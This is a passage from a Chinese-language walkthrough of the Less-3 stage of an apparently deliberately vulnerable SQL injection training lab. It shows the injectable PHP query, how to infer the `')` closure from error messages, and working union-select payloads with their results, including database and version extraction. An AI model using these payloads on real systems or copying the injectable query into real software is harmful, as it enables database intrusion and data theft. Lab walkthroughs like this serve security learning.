# Less-3

> [总目录](README.md) ｜ [基础知识](00-基础知识.md) ｜ [完整版合集](Less-1-20-全合集.md)

| 项目 | 内容 |
|---|---|
| **注入类型** | GET · 报错型 |
| **闭合方式** | `')` |
| **成败信号** | 直接回显 username / password |
| **一句话** | 引号外还套了括号 |
| **核心 payload** | `?id=-1') union select 1,2,3--+` |

---

**GET · 报错型 · 单引号 + 括号**

### 源码

```php
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
                                ↑        ↑
                              多了括号
```

### 判断闭合方式

```
?id=1'    →  报错 near ''1'') LIMIT 0,1'
```
从报错信息里能直接看到剩下的 `')`，这就是提示。所以闭合要用 **`')`**：

```
输入：1') --+
结果：SELECT * FROM users WHERE id=('1') --+ LIMIT 0,1
```

### 通关 payload（实测）

```
?id=1') --+                       →  user=Dumb  pass=Dumb
?id=-1') union select 1,2,3--+    →  user=2  pass=3
?id=-1') union select 1,database(),version()--+  →  user=security  pass=5.7.26
```

> 💡 **技巧**：报错信息里 `near` 后面那一小段，就是告诉你「还差什么闭合」的最好提示。

---

[← Less-2](Less-02.md) ｜ [返回目录](README.md) ｜ [Less-4 →](Less-04.md)